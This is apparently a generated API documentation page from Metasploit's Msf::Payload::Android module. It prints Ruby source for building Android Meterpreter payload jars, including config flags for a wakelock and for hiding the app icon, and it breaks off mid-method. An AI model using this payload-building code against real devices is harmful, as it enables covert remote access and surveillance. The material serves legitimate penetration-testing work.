@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Android
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Android";
+  relpath = '../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../_index.html">Index (A)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Payload.html" title="Msf::Payload (class)">Payload</a></span></span>
+     &raquo; 
+    <span class="title">Android</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Android
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="TransportConfig.html" title="Msf::Payload::TransportConfig (module)">TransportConfig</a></span>, <span class='object_link'><a href="UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></dd>
+  </dl>
+  
+  
+
+  
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="Android/MeterpreterLoader.html" title="Msf::Payload::Android::MeterpreterLoader (module)">MeterpreterLoader</a></span>, <span class='object_link'><a href="Android/ReverseHttp.html" title="Msf::Payload::Android::ReverseHttp (module)">ReverseHttp</a></span>, <span class='object_link'><a href="Android/ReverseTcp.html" title="Msf::Payload::Android::ReverseTcp (module)">ReverseTcp</a></span></dd>
+  </dl>
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/android.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Defined Under Namespace</h2>
+<p class="children">
+  
+    
+      <strong class="modules">Modules:</strong> <span class='object_link'><a href="Android/MeterpreterLoader.html" title="Msf::Payload::Android::MeterpreterLoader (module)">MeterpreterLoader</a></span>, <span class='object_link'><a href="Android/PayloadOptions.html" title="Msf::Payload::Android::PayloadOptions (module)">PayloadOptions</a></span>, <span class='object_link'><a href="Android/ReverseHttp.html" title="Msf::Payload::Android::ReverseHttp (module)">ReverseHttp</a></span>, <span class='object_link'><a href="Android/ReverseHttps.html" title="Msf::Payload::Android::ReverseHttps (module)">ReverseHttps</a></span>, <span class='object_link'><a href="Android/ReverseTcp.html" title="Msf::Payload::Android::ReverseTcp (module)">ReverseTcp</a></span>
+    
+  
+    
+  
+</p>
+
+
+
+  <h2>Constant Summary</h2>
+  
+  <h3 class="inherited">Constants included
+     from <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN_MAX_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITJ-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITP-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITW-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INIT_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MODES-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_UUID_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN</a></span></p>
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#fix_dex_header-instance_method" title="#fix_dex_header (instance method)">#<strong>fix_dex_header</strong>(dexfile)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Fix the dex header checksum and signature <a href="http://source.android.com/tech/dalvik/dex-format.html">source.android.com/tech/dalvik/dex-format.html</a>.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate-instance_method" title="#generate (instance method)">#<strong>generate</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Used by stagers to construct the payload jar file as a String.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_config-instance_method" title="#generate_config (instance method)">#<strong>generate_config</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_default_stage-instance_method" title="#generate_default_stage (instance method)">#<strong>generate_default_stage</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_jar-instance_method" title="#generate_jar (instance method)">#<strong>generate_jar</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_stage-instance_method" title="#generate_stage (instance method)">#<strong>generate_stage</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>We could compile the .class files with dx here.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#java_string-instance_method" title="#java_string (instance method)">#<strong>java_string</strong>(str)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#sign_jar-instance_method" title="#sign_jar (instance method)">#<strong>sign_jar</strong>(jar)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#signing_key-instance_method" title="#signing_key (instance method)">#<strong>signing_key</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="UUID/Options.html#generate_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#generate_payload_uuid (method)">#generate_payload_uuid</a></span>, <span class='object_link'><a href="UUID/Options.html#generate_uri_uuid_mode-instance_method" title="Msf::Payload::UUID::Options#generate_uri_uuid_mode (method)">#generate_uri_uuid_mode</a></span>, <span class='object_link'><a href="UUID/Options.html#initialize-instance_method" title="Msf::Payload::UUID::Options#initialize (method)">#initialize</a></span>, <span class='object_link'><a href="UUID/Options.html#record_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid (method)">#record_payload_uuid</a></span>, <span class='object_link'><a href="UUID/Options.html#record_payload_uuid_url-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid_url (method)">#record_payload_uuid_url</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_checksum-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_checksum (method)">#generate_uri_checksum</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_uuid-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_uuid (method)">#generate_uri_uuid</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#process_uri_resource-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#process_uri_resource (method)">#process_uri_resource</a></span>, <span class='object_link'><a href="../../Rex/Payloads/Meterpreter/UriChecksum.html#uri_checksum_lookup-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#uri_checksum_lookup (method)">#uri_checksum_lookup</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="TransportConfig.html" title="Msf::Payload::TransportConfig (module)">TransportConfig</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="TransportConfig.html#transport_config_bind_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_named_pipe (method)">#transport_config_bind_named_pipe</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_config_bind_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_tcp (method)">#transport_config_bind_tcp</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_config_reverse_http-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_http (method)">#transport_config_reverse_http</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_config_reverse_https-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_https (method)">#transport_config_reverse_https</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_config_reverse_ipv6_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_ipv6_tcp (method)">#transport_config_reverse_ipv6_tcp</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_config_reverse_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_named_pipe (method)">#transport_config_reverse_named_pipe</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_config_reverse_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_tcp (method)">#transport_config_reverse_tcp</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_config_reverse_udp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_udp (method)">#transport_config_reverse_udp</a></span>, <span class='object_link'><a href="TransportConfig.html#transport_uri_components-instance_method" title="Msf::Payload::TransportConfig#transport_uri_components (method)">#transport_uri_components</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="Pingback/Options.html" title="Msf::Payload::Pingback::Options (module)">Pingback::Options</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="Pingback/Options.html#initialize-instance_method" title="Msf::Payload::Pingback::Options#initialize (method)">#initialize</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="fix_dex_header-instance_method">
+  
+    #<strong>fix_dex_header</strong>(dexfile)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Fix the dex header checksum and signature <a href="http://source.android.com/tech/dalvik/dex-format.html">source.android.com/tech/dalvik/dex-format.html</a></p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+16
+17
+18
+19
+20
+21</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 16</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_fix_dex_header'>fix_dex_header</span><span class='lparen'>(</span><span class='id identifier rubyid_dexfile'>dexfile</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_dexfile'>dexfile</span> <span class='op'>=</span> <span class='id identifier rubyid_dexfile'>dexfile</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>a8LH40a*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_dexfile'>dexfile</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='const'>Digest</span><span class='op'>::</span><span class='const'>SHA1</span><span class='period'>.</span><span class='id identifier rubyid_hexdigest'>hexdigest</span><span class='lparen'>(</span><span class='id identifier rubyid_dexfile'>dexfile</span><span class='lbracket'>[</span><span class='int'>3</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_dexfile'>dexfile</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='const'>Zlib</span><span class='period'>.</span><span class='id identifier rubyid_adler32'>adler32</span><span class='lparen'>(</span><span class='id identifier rubyid_dexfile'>dexfile</span><span class='lbracket'>[</span><span class='int'>2</span><span class='op'>..</span><span class='op'>-</span><span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>H40a*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_dexfile'>dexfile</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>a8LH40a*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate-instance_method">
+  
+    #<strong>generate</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Used by stagers to construct the payload jar file as a String</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+37
+38
+39</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 37</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_generate_jar'>generate_jar</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_config-instance_method">
+  
+    #<strong>generate_config</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 45</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_config'>generate_config</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span> <span class='op'>||=</span> <span class='id identifier rubyid_generate_payload_uuid'>generate_payload_uuid</span>
+  <span class='id identifier rubyid_ds'>ds</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:datastore</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_datastore'>datastore</span>
+
+  <span class='id identifier rubyid_config_opts'>config_opts</span> <span class='op'>=</span> <span class='lbrace'>{</span>
+    <span class='label'>ascii_str:</span>  <span class='kw'>true</span><span class='comma'>,</span>
+    <span class='label'>arch:</span>       <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_arch'>arch</span><span class='comma'>,</span>
+    <span class='label'>expiration:</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionExpirationTimeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span>
+    <span class='label'>uuid:</span>       <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>transports:</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:transport_config</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='lbracket'>[</span><span class='id identifier rubyid_transport_config'>transport_config</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>stageless:</span>  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:stageless</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span>
+  <span class='rbrace'>}</span>
+
+  <span class='id identifier rubyid_config'>config</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Rex/Payloads.html" title="Rex::Payloads (module)">Payloads</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Rex/Payloads/Meterpreter.html" title="Rex::Payloads::Meterpreter (module)">Meterpreter</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Rex/Payloads/Meterpreter/Config.html" title="Rex::Payloads::Meterpreter::Config (class)">Config</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../Rex/Payloads/Meterpreter/Config.html#initialize-instance_method" title="Rex::Payloads::Meterpreter::Config#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_config_opts'>config_opts</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_b'><span class='object_link'><a href="../../Rex/Payloads/Meterpreter/Config.html#to_b-instance_method" title="Rex::Payloads::Meterpreter::Config#to_b (method)">to_b</a></span></span>
+  <span class='id identifier rubyid_flags'>flags</span> <span class='op'>=</span> <span class='int'>0</span>
+  <span class='id identifier rubyid_flags'>flags</span> <span class='op'>|=</span> <span class='int'>1</span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:stageless</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_flags'>flags</span> <span class='op'>|=</span> <span class='int'>2</span> <span class='kw'>if</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AndroidMeterpreterDebug</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_flags'>flags</span> <span class='op'>|=</span> <span class='int'>4</span> <span class='kw'>if</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AndroidWakelock</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_flags'>flags</span> <span class='op'>|=</span> <span class='int'>8</span> <span class='kw'>if</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AndroidHideAppIcon</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_config'>config</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_flags'>flags</span><span class='period'>.</span><span class='id identifier rubyid_chr'>chr</span>
+  <span class='id identifier rubyid_config'>config</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_default_stage-instance_method">
+  
+    #<strong>generate_default_stage</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+30
+31
+32</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 30</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_default_stage'>generate_default_stage</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_jar-instance_method">
+  
+    #<strong>generate_jar</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 111</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_jar'>generate_jar</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_config'>config</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_config'>generate_config</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:stageless</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_classes'>classes</span> <span class='op'>=</span> <span class='const'>MetasploitPayloads</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>android</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>meterpreter.dex</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='comment'># Add stageless classname at offset 8000
+</span>    <span class='id identifier rubyid_config'>config</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>*</span> <span class='lparen'>(</span><span class='int'>8000</span> <span class='op'>-</span> <span class='id identifier rubyid_config'>config</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_config'>config</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>com.metasploit.meterpreter.AndroidMeterpreter</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_classes'>classes</span> <span class='op'>=</span> <span class='const'>MetasploitPayloads</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>android</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>apk</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>classes.dex</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_config'>config</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>*</span> <span class='lparen'>(</span><span class='int'>8195</span> <span class='op'>-</span> <span class='id identifier rubyid_config'>config</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_classes'>classes</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xde\xad\xba\xad</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>*</span> <span class='int'>8191</span><span class='comma'>,</span> <span class='id identifier rubyid_config'>config</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_jar'>jar</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Zip</span><span class='op'>::</span><span class='const'>Jar</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+  <span class='id identifier rubyid_files'>files</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+    <span class='lbracket'>[</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>AndroidManifest.xml</span><span class='tstring_end'>&quot;</span></span> <span class='rbracket'>]</span><span class='comma'>,</span>
